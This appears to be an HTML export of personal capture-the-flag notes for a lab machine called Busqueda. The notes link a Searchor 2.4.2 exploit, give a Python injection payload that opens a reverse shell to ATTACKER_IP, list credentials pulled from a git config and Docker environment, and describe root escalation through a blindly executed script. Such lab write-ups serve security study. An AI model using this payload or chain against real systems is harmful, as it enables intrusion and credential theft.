<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>busqueda</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>busqueda</h1><br/><p><img src="images/77-1.png" alt="images/77-1.png" /></p><p></p><p>exploit:</p><p><a href="https://github.com/jonnyzar/POC-Searchor-2.4.2">https://github.com/jonnyzar/POC-Searchor-2.4.2</a></p><p></p><p>payload: </p><p></p><p>&#39;, exec(&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;ATTACKER_IP&#39;,PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/sh&#39;,&#39;-i&#39;]);&quot;))#</p><p></p><p></p><p></p><p></p><p></p><p><img src="images/77-2.png" alt="images/77-2.png" /></p><p></p><p></p><p><img src="images/77-3.png" alt="images/77-3.png" /></p><p></p><p></p><p></p><p><img src="images/77-4.png" alt="images/77-4.png" /></p><p></p><p>do ls -al</p><p>go to .git/ and read the config</p><p><a href="http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git">http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git</a></p><p><img src="images/77-5.png" alt="images/77-5.png" /></p><p></p><p></p><p><img src="images/77-6.png" alt="images/77-6.png" /></p><p></p><p></p><p></p><p>sudo /usr/bin/python3 /opt/scripts/system-checkup.py</p><p></p><p></p><p><a href="https://docs.docker.com/engine/reference/commandline/inspect/">Documentation</a><h2>: &quot;</h2><em>Return low-level information on Docker objects</em><h2>&quot;.</h2></p><p></p><p>sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect &#39;{{json .Config}}&#39; f84a6b33fb5a</p><p>&quot;Hostname&quot;:&quot;f84a6b33fb5a&quot;</p><p>MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF</p><p>MYSQL_USER=gitea</p><p>MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh</p><p>MYSQL_DATABASE=gitea</p><p></p><p><img src="images/77-7.png" alt="images/77-7.png" /></p><p></p><p></p><p></p><p><img src="images/77-8.png" alt="images/77-8.png" /></p><p></p><p></p><p><img src="images/77-9.png" alt="images/77-9.png" /></p><p></p><p>one of the password worked for admin it was: yuiu1hoiu4i5ho1uh</p><p></p><p><img src="images/77-10.png" alt="images/77-10.png" /></p><p></p><p>now in the system-checkup file:</p><p><img src="images/77-11.png" alt="images/77-11.png" /> this code blindly runs the full-checkup.sh file in it&#39;s dir and we can thus create our own this file and run this code as root</p></div>
</body>
</html>
